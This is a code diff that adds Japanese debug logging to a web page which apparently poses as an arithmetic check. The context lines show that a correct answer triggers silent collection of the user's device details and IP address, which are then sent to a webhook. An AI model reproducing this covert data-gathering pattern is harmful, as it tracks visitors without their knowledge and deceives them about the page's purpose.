@@ -19,6 +19,7 @@
             document.getElementById('num1').value = num1;
             document.getElementById('num2').value = num2;
             document.getElementById('goButton').style.display = 'none';
+            console.log('問題を生成しました:', num1, num2); // デバッグ用ログ
         }
 
         // ユーザーの機種情報を取得する関数
@@ -46,7 +47,7 @@
                     callback(data.ip);
                 })
                 .catch(error => {
-                    console.error('Error fetching IP address:', error);
+                    console.error('IPアドレス取得エラー:', error); // デバッグ用ログ
                     callback(null);
                 });
         }
@@ -58,10 +59,15 @@
             const userAnswer = parseInt(document.getElementById('answer').value);
             const correctAnswer = num1 + num2;
 
+            console.log('ユーザーの回答:', userAnswer, '正解:', correctAnswer); // デバッグ用ログ
+
             if (userAnswer === correctAnswer) {
                 getDeviceInfo(function(deviceInfo) {
+                    console.log('機種情報を取得しました:', deviceInfo); // デバッグ用ログ
                     getIPAddress(function(ipAddress) {
+                        console.log('IPアドレスを取得しました:', ipAddress); // デバッグ用ログ
                         sendWebhook(deviceInfo, ipAddress, function() {
+                            console.log('Webhook送信完了'); // デバッグ用ログ
                             document.getElementById('goButton').style.display = 'block';
                         });
                     });
@@ -102,7 +108,7 @@
                 callback();
             })
             .catch(error => {
-                console.error('Error sending webhook:', error);
+                console.error('Webhook送信エラー:', error); // デバッグ用ログ
                 callback(); // エラーがあってもボタンを表示
             });
         }
